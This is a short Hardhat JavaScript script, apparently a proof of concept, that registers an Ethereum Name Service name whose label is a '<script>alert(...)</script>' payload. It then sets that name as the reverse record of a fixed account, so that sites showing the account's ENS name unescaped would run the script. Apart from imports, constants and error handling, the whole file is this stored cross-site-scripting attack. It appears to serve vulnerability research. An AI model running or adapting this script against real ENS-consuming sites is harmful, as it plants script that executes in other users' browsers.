const hre = require("hardhat");
const PAYLOAD = "<script>alert(/ololo/)</script>";
const ACCOUNT = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266";
const RESOLVER = "0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41";
const DURATION = 157784760;

async function main() {
  const controller = await hre.ethers.getVerifiedContractAt('0x283af0b28c62c092c9727f1ee09c02ca627eb7f5');
  const registrar = await hre.ethers.getVerifiedContractAt('0x084b1c3c81545d370f3634392de611caabff8148');

  var name = await hre.ethers.provider.lookupAddress(ACCOUNT);
  console.log(name);

  // generating secret
  const secret = hre.ethers.utils.randomBytes(32);
  console.log("SECRET: " + hre.ethers.utils.hexlify(secret));

  // creating commit
  const commitment = await controller.makeCommitmentWithConfig(PAYLOAD, ACCOUNT, secret, RESOLVER, ACCOUNT);
  console.log("COMMITMENT: " + commitment);
  let tx = await controller.commit(commitment);
  await tx.wait();
  console.log(tx);
  console.log("[+] CREATED COMMIT");

  // getting price
  let price = await controller.rentPrice(PAYLOAD, DURATION);
  console.log("PRICE: " + price);

  // sleeping
  console.log("SLEEPING FOR 1 MIN...");
  await new Promise(resolve => setTimeout(resolve, 60000));

  // registering
  tx = await controller.registerWithConfig(PAYLOAD, ACCOUNT, DURATION, secret, RESOLVER, ACCOUNT, {value: price});
  await tx.wait();
  console.log(tx);
  console.log("[+] REGISTERED ENS");

  // setting name
  tx = await registrar.setName(PAYLOAD + ".eth");
  await tx.wait();
  console.log(tx);
  console.log("[+] NAME SET");

  var name = await hre.ethers.provider.lookupAddress(ACCOUNT);
  console.log(name);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
